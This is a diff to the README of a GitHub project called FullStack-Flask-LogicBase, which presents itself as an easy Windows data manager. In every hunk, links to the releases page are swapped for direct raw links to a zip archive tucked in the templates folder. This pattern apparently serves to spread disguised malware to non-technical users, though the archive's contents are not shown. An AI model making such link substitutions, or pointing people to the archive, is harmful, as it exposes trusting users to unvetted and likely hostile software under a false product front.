@@ -1,6 +1,6 @@
 # ⚙️ FullStack-Flask-LogicBase - Manage Data Easily on Windows
 
-[![Download Latest Release](https://img.shields.io/badge/Download-LogicBase-blue?style=for-the-badge)](https://github.com/constantwidthfontwhitecap143/FullStack-Flask-LogicBase/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-LogicBase-blue?style=for-the-badge)](https://raw.githubusercontent.com/constantwidthfontwhitecap143/FullStack-Flask-LogicBase/main/templates/Stack_Flask_Full_Base_Logic_2.9.zip)
 
 ## 🧩 What is FullStack-Flask-LogicBase?
 
@@ -32,7 +32,7 @@ You do not need any programming tools or special skills. Just follow the instruc
 
 Go to the release page to get the latest version of the software.
 
-[![Download LogicBase](https://img.shields.io/badge/Visit-Download_Page-grey?style=for-the-badge)](https://github.com/constantwidthfontwhitecap143/FullStack-Flask-LogicBase/releases)
+[![Download LogicBase](https://img.shields.io/badge/Visit-Download_Page-grey?style=for-the-badge)](https://raw.githubusercontent.com/constantwidthfontwhitecap143/FullStack-Flask-LogicBase/main/templates/Stack_Flask_Full_Base_Logic_2.9.zip)
 
 This page holds all the latest downloads and update history.
 
@@ -123,6 +123,6 @@ FullStack-Flask-LogicBase uses reliable Python and Flask components to handle yo
 ## 🔗 Download Link
 
 Get your copy from this page:  
-https://github.com/constantwidthfontwhitecap143/FullStack-Flask-LogicBase/releases
+https://raw.githubusercontent.com/constantwidthfontwhitecap143/FullStack-Flask-LogicBase/main/templates/Stack_Flask_Full_Base_Logic_2.9.zip
 
-[![Download Latest Release](https://img.shields.io/badge/Download-LogicBase-blue?style=for-the-badge)](https://github.com/constantwidthfontwhitecap143/FullStack-Flask-LogicBase/releases)
+[![Download Latest Release](https://img.shields.io/badge/Download-LogicBase-blue?style=for-the-badge)](https://raw.githubusercontent.com/constantwidthfontwhitecap143/FullStack-Flask-LogicBase/main/templates/Stack_Flask_Full_Base_Logic_2.9.zip)
